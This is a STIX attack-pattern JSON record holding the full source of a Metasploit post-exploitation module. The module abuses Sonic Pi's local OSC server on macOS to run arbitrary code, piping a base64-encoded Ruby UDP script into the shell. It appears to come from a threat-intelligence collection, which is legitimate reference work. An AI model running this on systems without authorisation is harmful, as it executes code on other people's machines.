{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66b0dbf7-3325-4792-9c9b-9b0b3b5339ed",
    "created": "2024-08-14T16:33:00.693449Z",
    "modified": "2024-08-14T16:33:00.693453Z",
    "name": "OS X Manage Sonic Pi",
    "description": " This module controls Sonic Pi via its local OSC server.  The server runs on 127.0.0.1:4557 and receives OSC messages over UDP.  Yes, this is RCE, but it's local. I suggest playing music. :-) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/manage/sonic_pi.rb",
            "external_id": "sonic_pi.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'OS X Manage Sonic Pi',\n        'Description' => %q{\n          This module controls Sonic Pi via its local OSC server.\n\n          The server runs on 127.0.0.1:4557 and receives OSC messages over UDP.\n\n          Yes, this is RCE, but it's local. I suggest playing music. :-)\n        },\n        'Author' => [\n          'Sam Aaron', # Sonic Pi\n          'wvu'        # Module and Sonic Pi example\n        ],\n        'References' => [\n          %w[URL https://sonic-pi.net/],\n          %w[URL https://github.com/samaaron/sonic-pi/wiki/Sonic-Pi-Internals----GUI-Ruby-API],\n          %w[URL http://opensoundcontrol.org/spec-1_0]\n        ],\n        'License' => MSF_LICENSE,\n        'Platform' => 'osx',\n        'SessionTypes' => %w[meterpreter shell],\n        'Actions' => [\n          ['Run', { 'Description' => 'Run Sonic Pi code' }],\n          ['Stop', { 'Description' => 'Stop all jobs' }]\n        ],\n        'DefaultAction' => 'Run',\n        'Notes' => {\n          'SideEffects' => [AUDIO_EFFECTS, SCREEN_EFFECTS]\n        }\n      )\n    )\n\n    register_options([\n      OptAddress.new('OSC_HOST', [true, 'OSC server host', '127.0.0.1']),\n      OptPort.new('OSC_PORT', [true, 'OSC server port', 4557]),\n      OptBool.new('START_SONIC_PI', [true, 'Start Sonic Pi', false]),\n      OptPath.new(\n        'FILE',\n        [\n          true,\n          'Path to Sonic Pi code',\n          File.join(Msf::Config.data_directory, 'post', 'sonic_pi_example.rb')\n        ]\n      )\n    ])\n\n    register_advanced_options([\n      OptString.new(\n        'SonicPiPath',\n        [\n          true,\n          'Path to Sonic Pi executable',\n          '/Applications/Sonic Pi.app/Contents/MacOS/Sonic Pi'\n        ]\n      ),\n      OptString.new(\n        'RubyPath',\n        [\n          true,\n          'Path to Ruby executable',\n          '/Applications/Sonic Pi.app/server/native/ruby/bin/ruby'\n        ]\n      )\n    ])\n  end\n\n  def osc_host\n    datastore['OSC_HOST']\n  end\n\n  def osc_port\n    datastore['OSC_PORT']\n  end\n\n  def sonic_pi\n    datastore['SonicPiPath'].shellescape\n  end\n\n  def ruby\n    datastore['RubyPath'].shellescape\n  end\n\n  def check_lsof\n    cmd_exec(\"lsof -ni :#{osc_port} && echo true\").end_with?('true')\n  end\n\n  def run\n    begin\n      unless check_lsof\n        print_error('Sonic Pi is not running')\n\n        return if @tried\n\n        if datastore['START_SONIC_PI']\n          print_status('Starting Sonic Pi...')\n\n          # XXX: shell_command_token uses ; as a command separator\n          cmd_exec(\"#{sonic_pi} & :\")\n          sleep(10)\n\n          @tried = true\n          raise RuntimeError\n        end\n\n        return\n      end\n    rescue RuntimeError\n      retry\n    end\n\n    print_good('Sonic Pi is running')\n\n    case action.name\n    when 'Run'\n      print_status(\"Running Sonic Pi code: #{datastore['FILE']}\")\n    when 'Stop'\n      print_status('Stopping all jobs')\n    end\n\n    cmd = \"echo #{Rex::Text.encode_base64(code)} | base64 -D | #{ruby}\"\n\n    vprint_status(cmd)\n    cmd_exec(cmd)\n  end\n\n  def code\n    <<~EOF\n      require 'socket'\n      UDPSocket.new.send(\"#{msg}\", 0, '#{osc_host}', #{osc_port})\n    EOF\n  end\n\n  def msg\n    Rex::Text.to_hex_ascii(\n      case action.name\n      when 'Run'\n        \"/run-code\\x00\\x00\\x00,ss\\x00#{agent}#{file}\"\n      when 'Stop'\n        \"/stop-all-jobs\\x00\\x00,\\x00\\x00\\x00\"\n      end\n    )\n  end\n\n  def agent\n    # Generate random null-terminated agent string\n    agent = \"#{Faker::App.name}\\x00\"\n\n    # Pad string with nulls until its length is a multiple of 32 bits\n    agent << \"\\x00\" until agent.length % 4 == 0\n\n    # Return null-terminated and null-padded string\n    agent\n  end\n\n  def file\n    # Read file as null-terminated string\n    @file = \"#{File.read(datastore['FILE'], mode: 'rb')}\\x00\"\n\n    # Pad string with nulls until its length is a multiple of 32 bits\n    @file << \"\\x00\" until @file.length % 4 == 0\n\n    # Return null-terminated and null-padded string\n    @file\n  end\n\nend\n",
    "x_mitre_platforms": [
        "osx'"
    ]
}